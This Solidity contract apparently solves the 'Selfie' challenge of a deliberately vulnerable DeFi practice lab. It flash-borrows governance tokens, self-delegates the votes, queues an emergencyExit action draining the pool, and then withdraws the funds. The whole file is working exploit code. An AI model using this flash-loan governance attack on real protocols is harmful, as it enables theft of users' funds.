//SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "./DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

contract Attacker is IERC3156FlashBorrower {
    SimpleGovernance public governance;
    SelfiePool public selfiePool;
    DamnValuableVotes private _votingToken;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    bytes private CALLDATA = abi.encodeWithSignature("emergencyExit(address)",address(this));

    constructor(SimpleGovernance _governance, SelfiePool _selfiePool,DamnValuableVotes _token) {
        governance = _governance;
        selfiePool = _selfiePool;
        _votingToken = _token;
    }

    function attack() public {
        selfiePool.flashLoan(this, address(_votingToken), selfiePool.maxFlashLoan(address(_votingToken)), "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        _votingToken.delegate(address(this));
        governance.queueAction(address(selfiePool),0,CALLDATA);
        _votingToken.approve(address(selfiePool),_votingToken.balanceOf(address(this)));
        return CALLBACK_SUCCESS;
    }

    function executeAction(uint256 actionId) external {
        governance.executeAction(actionId);
    }

    function withdraw(address _recovery) public {
        _votingToken.transfer(_recovery, _votingToken.balanceOf(address(this)));
    }
}